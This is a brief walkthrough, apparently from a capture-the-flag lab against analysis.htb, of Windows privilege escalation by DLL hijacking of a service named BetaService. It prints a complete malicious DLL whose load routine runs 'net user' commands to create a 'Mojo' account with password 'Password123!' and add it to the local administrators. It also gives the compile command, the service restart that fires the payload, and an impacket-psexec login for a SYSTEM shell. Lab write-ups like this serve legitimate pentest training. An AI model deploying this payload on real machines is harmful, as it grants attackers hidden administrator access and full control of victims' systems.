# DLL Hijacking

In this example, we check running services to discover the unknown service `BetaService`. We don't have write permissions for the related `.exe` so we cannot binary hijack, instead we will attempt to DLL hijack.

To do this, we first need to open process explorer and restart the service with the following command

```powershell
Restart-Service BetaService
```

We can then discover the service is searching for `myDLL.dll` in a variety of paths that we then check

```powershell
$env:path
```

In this example we have write permissions to `Documents` which is the first place the service looks for `myDLL.dll` in.

We can use the following example as a template for our DLL injection

```cs
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

We can then make the following modifications to leverage the DLL injection vulnerability

```cs
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user Mojo Password123! /add");
  	    i = system ("net localgroup administrators Mojo /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

And compile it with `mingw32`

```bash
x86_64-w64-mingw32-gcc myDLL.cpp -o myDLL.dll -shared
```

After uploading `myDLL.dll` to documents, we can then simply restart the service again and see `mojo` pop up as a member of the group `administrators`

```powershell
Restart-Service BetaService
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```

We can now login to the machine as `nt authority\system` with `impacket-psexec`

```bash
impacket-psexec 'analysis.htb/Mojo:Password123!@10.129.189.54'
```
